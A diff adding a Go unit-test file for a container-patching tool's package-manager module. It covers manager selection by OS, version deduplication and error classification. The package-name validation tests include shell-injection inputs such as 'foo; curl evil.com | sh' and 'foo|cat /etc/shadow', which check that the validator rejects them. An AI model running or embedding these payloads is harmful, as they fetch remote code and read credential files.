@@ -1,0 +1,482 @@
+package pkgmgr
+
+import (
+	"context"
+	"fmt"
+	"reflect"
+	"strings"
+	"testing"
+
+	"github.com/moby/buildkit/client/llb"
+	"github.com/project-copacetic/copacetic/pkg/buildkit"
+	"github.com/project-copacetic/copacetic/pkg/types/unversioned"
+	"github.com/project-copacetic/copacetic/pkg/utils"
+	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/require"
+)
+
+// TestGetPackageManager tests the GetPackageManager function.
+func TestGetPackageManager(t *testing.T) {
+	// Create a mock config and workingFolder
+	config := &buildkit.Config{}
+
+	t.Run("should return an apkManager for alpine", func(t *testing.T) {
+		manager, err := GetPackageManager(utils.OSTypeAlpine, "1.0", config, utils.DefaultTempWorkingFolder)
+
+		// Assert that there is no error and the manager is not nil
+		assert.NoError(t, err)
+		assert.NotNil(t, manager)
+
+		// Assert that the manager is an instance of apkManager
+		assert.IsType(t, &apkManager{}, manager)
+	})
+
+	t.Run("should return a dpkgManager for debian", func(t *testing.T) {
+		manager, err := GetPackageManager(utils.OSTypeDebian, "1.0", config, utils.DefaultTempWorkingFolder)
+
+		// Assert that there is no error and the manager is not nil
+		assert.NoError(t, err)
+		assert.NotNil(t, manager)
+
+		// Assert that the manager is an instance of dpkgManager
+		assert.IsType(t, &dpkgManager{}, manager)
+	})
+
+	t.Run("should return a dpkgManager for ubuntu", func(t *testing.T) {
+		manager, err := GetPackageManager(utils.OSTypeUbuntu, "1.0", config, utils.DefaultTempWorkingFolder)
+
+		// Assert that there is no error and the manager is not nil
+		assert.NoError(t, err)
+		assert.NotNil(t, manager)
+
+		// Assert that the manager is an instance of dpkgManager
+		assert.IsType(t, &dpkgManager{}, manager)
+	})
+
+	t.Run("should return an rpmManager for cbl-mariner", func(t *testing.T) {
+		manager, err := GetPackageManager(utils.OSTypeCBLMariner, "1.0", config, utils.DefaultTempWorkingFolder)
+
+		// Assert that there is no error and the manager is not nil
+		assert.NoError(t, err)
+		assert.NotNil(t, manager)
+
+		// Assert that the manager is an instance of rpmManager
+		assert.IsType(t, &rpmManager{}, manager)
+	})
+
+	t.Run("should return an rpmManager for azurelinux", func(t *testing.T) {
+		manager, err := GetPackageManager(utils.OSTypeAzureLinux, "1.0", config, utils.DefaultTempWorkingFolder)
+
+		// Assert that there is no error and the manager is not nil
+		assert.NoError(t, err)
+		assert.NotNil(t, manager)
+
+		// Assert that the manager is an instance of rpmManager
+		assert.IsType(t, &rpmManager{}, manager)
+	})
+
+	t.Run("should return an rpmManager for redhat", func(t *testing.T) {
+		manager, err := GetPackageManager(utils.OSTypeRedHat, "1.0", config, utils.DefaultTempWorkingFolder)
+
+		// Assert that there is no error and the manager is not nil
+		assert.NoError(t, err)
+		assert.NotNil(t, manager)
+
+		// Assert that the manager is an instance of rpmManager
+		assert.IsType(t, &rpmManager{}, manager)
+	})
+
+	t.Run("should return an rpmManager for sles and bci", func(t *testing.T) {
+		// Call the GetPackageManager function with "sles" as osType
+		manager, err := GetPackageManager(utils.OSTypeSLES, "15.7", config, utils.DefaultTempWorkingFolder)
+
+		// Assert that there is no error and the manager is not nil
+		assert.NoError(t, err)
+		assert.NotNil(t, manager)
+
+		// Assert that the manager is an instance of rpmManager
+		assert.IsType(t, &rpmManager{}, manager)
+	})
+
+	t.Run("should return an rpmManager for opensuse leap", func(t *testing.T) {
+		// Call the GetPackageManager function with "opensuse-leap" as osType
+		manager, err := GetPackageManager(utils.OSTypeOpenSUSELeap, "15.6", config, utils.DefaultTempWorkingFolder)
+
+		// Assert that there is no error and the manager is not nil
+		assert.NoError(t, err)
+		assert.NotNil(t, manager)
+
+		// Assert that the manager is an instance of rpmManager
+		assert.IsType(t, &rpmManager{}, manager)
+	})
+
+	t.Run("should return an rpmManager for opensuse tumbleweed", func(t *testing.T) {
+		// Call the GetPackageManager function with "opensuse-tumbleweed" as osType
+		manager, err := GetPackageManager(utils.OSTypeOpenSUSETW, "latest", config, utils.DefaultTempWorkingFolder)
+
+		// Assert that there is no error and the manager is not nil
+		assert.NoError(t, err)
+		assert.NotNil(t, manager)
+
+		// Assert that the manager is an instance of rpmManager
+		assert.IsType(t, &rpmManager{}, manager)
+	})
+
+	t.Run("should return an error for unsupported osType", func(t *testing.T) {
+		// Call the GetPackageManager function with "unsupported" as osType
+		manager, err := GetPackageManager("unsupported", "", config, utils.DefaultTempWorkingFolder)
+
+		// Assert that there is an error and the manager is nil
+		assert.Error(t, err)
+		assert.Nil(t, manager)
+	})
+}
+
+func TestGetPackageManagerChiselReleaseOption(t *testing.T) {
+	config := &buildkit.Config{}
+
+	manager, err := GetPackageManagerWithOptions(utils.OSTypeUbuntu, "24.04", config, utils.DefaultTempWorkingFolder, PackageManagerOptions{
+		ChiselRelease: "ubuntu-24.04",
+	})
+	require.NoError(t, err)
+	dpkg, ok := manager.(*dpkgManager)
+	require.True(t, ok)
+	assert.Equal(t, "ubuntu-24.04", dpkg.chiselRelease)
+
+	legacyManager, err := GetPackageManager(utils.OSTypeUbuntu, "24.04", config, utils.DefaultTempWorkingFolder)
+	require.NoError(t, err)
+	legacyDPKG, ok := legacyManager.(*dpkgManager)
+	require.True(t, ok)
+	assert.Empty(t, legacyDPKG.chiselRelease)
+}
+
+type metadataTestManager struct {
+	annotations map[string]string
+}
+
+func (m *metadataTestManager) InstallUpdates(context.Context, *unversioned.UpdateManifest, bool) (*llb.State, []string, error) {
+	state := llb.Scratch()
+	return &state, nil, nil
+}
+
+func (m *metadataTestManager) GetPackageType() string {
+	return "test"
+}
+
+func (m *metadataTestManager) Annotations() map[string]string {
+	return m.annotations
+}
+
+func TestGetPackageManagerAnnotations(t *testing.T) {
+	source := map[string]string{
+		ChiselReleaseAnnotation: "ubuntu-24.04",
+		ChiselVersionAnnotation: "v1.4.2",
+	}
+	manager := &metadataTestManager{annotations: source}
+
+	annotations := GetPackageManagerAnnotations(manager)
+	assert.Equal(t, source, annotations)
+
+	annotations[ChiselReleaseAnnotation] = "changed"
+	assert.Equal(t, "ubuntu-24.04", source[ChiselReleaseAnnotation], "returned annotations must be a defensive copy")
+	assert.Nil(t, GetPackageManagerAnnotations(&apkManager{}))
+}
+
+func IsValid(version string) bool {
+	return version != "invalid"
+}
+
+func LessThan(v1, v2 string) bool {
+	// Simplistic comparison for testing
+	return v1 < v2
+}
+
+func TestGetUniqueLatestUpdates(t *testing.T) {
+	cmp := VersionComparer{IsValid, LessThan}
+
+	tests := []struct {
+		name          string
+		updates       unversioned.UpdatePackages
+		ignoreErrors  bool
+		want          unversioned.UpdatePackages
+		expectedError string
+	}{
+		{
+			name:          "empty updates returns empty slice no error",
+			updates:       unversioned.UpdatePackages{},
+			ignoreErrors:  false,
+			want:          unversioned.UpdatePackages{},
+			expectedError: "",
+		},
+		{
+			name: "valid updates",
+			updates: unversioned.UpdatePackages{
+				{Name: "pkg1", FixedVersion: "1.0"},
+				{Name: "pkg1", FixedVersion: "2.0"},
+			},
+			ignoreErrors: false,
+			want: unversioned.UpdatePackages{
+				{Name: "pkg1", FixedVersion: "2.0"},
+			},
+			expectedError: "",
+		},
+		{
+			name: "updates with invalid version",
+			updates: unversioned.UpdatePackages{
+				{Name: "pkg1", FixedVersion: "invalid"},
+			},
+			ignoreErrors:  false,
+			want:          nil,
+			expectedError: "invalid version invalid found for package pkg1",
+		},
+		{
+			name: "ignore errors",
+			updates: unversioned.UpdatePackages{
+				{Name: "pkg1", FixedVersion: "invalid"},
+			},
+			ignoreErrors:  true,
+			want:          unversioned.UpdatePackages{},
+			expectedError: "",
+		},
+		{
+			name: "Updates with the same highest version",
+			updates: unversioned.UpdatePackages{
+				{Name: "pkg2", FixedVersion: "2.0"},
+				{Name: "pkg1", FixedVersion: "1.0"},
+				{Name: "pkg2", FixedVersion: "2.0"},
+				{Name: "pkg1", FixedVersion: "1.0"},
+			},
+			ignoreErrors: false,
+			want: unversioned.UpdatePackages{
+				{Name: "pkg1", FixedVersion: "1.0"},
+				{Name: "pkg2", FixedVersion: "2.0"},
+			},
+			expectedError: "",
+		},
+		{
+			name: "Invalid versions with ignoreErrors true",
+			updates: unversioned.UpdatePackages{
+				{Name: "pkg1", FixedVersion: "invalid"},
+				{Name: "pkg2", FixedVersion: "3.0"},
+				{Name: "pkg3", FixedVersion: "invalid"},
+			},
+			ignoreErrors: true,
+			want: unversioned.UpdatePackages{
+				{Name: "pkg2", FixedVersion: "3.0"},
+			},
+			expectedError: "",
+		},
+		{
+			name: "Updates with decreasing versions",
+			updates: unversioned.UpdatePackages{
+				{Name: "pkg1", FixedVersion: "2.0"},
+				{Name: "pkg1", FixedVersion: "1.5"},
+				{Name: "pkg1", FixedVersion: "3.0"},
+			},
+			ignoreErrors: false,
+			want: unversioned.UpdatePackages{
+				{Name: "pkg1", FixedVersion: "3.0"},
+			},
+			expectedError: "",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got, err := GetUniqueLatestUpdates(tt.updates, cmp, tt.ignoreErrors)
+			if err != nil {
+				if tt.expectedError == "" {
+					t.Errorf("GetUniqueLatestUpdates() unexpected error = %v", err)
+				} else if !strings.Contains(err.Error(), tt.expectedError) {
+					t.Errorf("GetUniqueLatestUpdates() error = %v, wantErrMsg %v", err, tt.expectedError)
+				}
+			} else if tt.expectedError != "" {
+				t.Errorf("GetUniqueLatestUpdates() expected error %v, got none", tt.expectedError)
+			}
+
+			if !reflect.DeepEqual(got, tt.want) {
+				t.Errorf("%s: got = %v, want %v", tt.name, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestValidateOSPackageNames(t *testing.T) {
+	tests := []struct {
+		name    string
+		updates unversioned.UpdatePackages
+		wantErr bool
+	}{
+		{
+			name: "valid dpkg package names",
+			updates: unversioned.UpdatePackages{
+				{Name: "libc6", FixedVersion: "2.31-13"},
+				{Name: "libssl1.1", FixedVersion: "1.1.1w-0+deb11u1"},
+				{Name: "zlib1g", FixedVersion: "1:1.2.11.dfsg-2+deb11u2"},
+			},
+			wantErr: false,
+		},
+		{
+			name: "valid rpm package names",
+			updates: unversioned.UpdatePackages{
+				{Name: "openssl-libs", FixedVersion: "1.1.1k-12.el8_9"},
+				{Name: "glibc", FixedVersion: "2.28-236.el8_9.12"},
+			},
+			wantErr: false,
+		},
+		{
+			name: "valid apk package names",
+			updates: unversioned.UpdatePackages{
+				{Name: "busybox", FixedVersion: "1.36.1-r15"},
+				{Name: "libcrypto3", FixedVersion: "3.1.4-r5"},
+			},
+			wantErr: false,
+		},
+		{
+			name:    "empty package name",
+			updates: unversioned.UpdatePackages{{Name: "", FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name:    "shell injection via semicolon",
+			updates: unversioned.UpdatePackages{{Name: "foo; curl evil.com | sh", FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name:    "shell injection via backtick",
+			updates: unversioned.UpdatePackages{{Name: "foo`whoami`", FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name:    "shell injection via dollar",
+			updates: unversioned.UpdatePackages{{Name: "foo$(id)", FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name:    "shell injection via pipe",
+			updates: unversioned.UpdatePackages{{Name: "foo|cat /etc/shadow", FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name:    "shell injection via ampersand",
+			updates: unversioned.UpdatePackages{{Name: "foo&&curl evil.com", FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name:    "package name too long",
+			updates: unversioned.UpdatePackages{{Name: strings.Repeat("a", 257), FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name:    "package name starting with hyphen",
+			updates: unversioned.UpdatePackages{{Name: "-badpkg", FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name: "mixed valid and invalid rejects all",
+			updates: unversioned.UpdatePackages{
+				{Name: "valid-pkg", FixedVersion: "1.0"},
+				{Name: "bad;pkg", FixedVersion: "2.0"},
+			},
+			wantErr: true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateOSPackageNames(tt.updates)
+			if tt.wantErr {
+				assert.Error(t, err)
+			} else {
+				assert.NoError(t, err)
+			}
+		})
+	}
+}
+
+// TestIsMarkerMissingErr verifies that isMarkerMissingErr only classifies
+// failures coming from ref.ReadFile (ReadFailed=true) as missing markers,
+// and never misclassifies solve-time errors — even when the solve error
+// text embeds the marker path (which happens when the check command itself
+// contains it).
+func TestIsMarkerMissingErr(t *testing.T) {
+	const marker = "/updates.txt"
+
+	tests := []struct {
+		name   string
+		err    *buildkit.ReadFileErr
+		marker string
+		want   bool
+	}{
+		{
+			name:   "nil err",
+			err:    nil,
+			marker: marker,
+			want:   false,
+		},
+		{
+			name: "empty marker path",
+			err: &buildkit.ReadFileErr{
+				Err:        fmt.Errorf("failed to stat /updates.txt: no such file or directory"),
+				ReadFailed: true,
+			},
+			marker: "",
+			want:   false,
+		},
+		{
+			name: "read phase: explicit missing file with marker path",
+			err: &buildkit.ReadFileErr{
+				Err:        fmt.Errorf("failed to stat /updates.txt: no such file or directory"),
+				ReadFailed: true,
+			},
+			marker: marker,
+			want:   true,
+		},
+		{
+			name: "read phase: missing file with basename only",
+			err: &buildkit.ReadFileErr{
+				Err:        fmt.Errorf("file not found: updates.txt"),
+				ReadFailed: true,
+			},
+			marker: marker,
+			want:   true,
+		},
+		{
+			name: "read phase: unrelated read error (no 'not found' phrasing)",
+			err: &buildkit.ReadFileErr{
+				Err:        fmt.Errorf("permission denied: /updates.txt"),
+				ReadFailed: true,
+			},
+			marker: marker,
+			want:   false,
+		},
+		{
+			name: "solve phase: error text contains marker path and 'not found' (must NOT misclassify)",
+			err: &buildkit.ReadFileErr{
+				// Simulates a solve-time failure where the vertex command
+				// string embeds the marker path — exactly the false-positive
+				// scenario that the Codex P1 review surfaced.
+				Err:         fmt.Errorf("failed to solve: process \"sh -c 'if apk list | grep upgradable; then touch /updates.txt; fi'\" did not complete successfully: command not found"),
+				SolveFailed: true,
+			},
+			marker: marker,
+			want:   false,
+		},
+		{
+			name: "solve phase: plain solve failure",
+			err: &buildkit.ReadFileErr{
+				Err:         fmt.Errorf("failed to solve: exit code 1"),
+				SolveFailed: true,
+			},
+			marker: marker,
+			want:   false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := isMarkerMissingErr(tt.err, tt.marker)
+			assert.Equal(t, tt.want, got)
+		})
+	}
+}
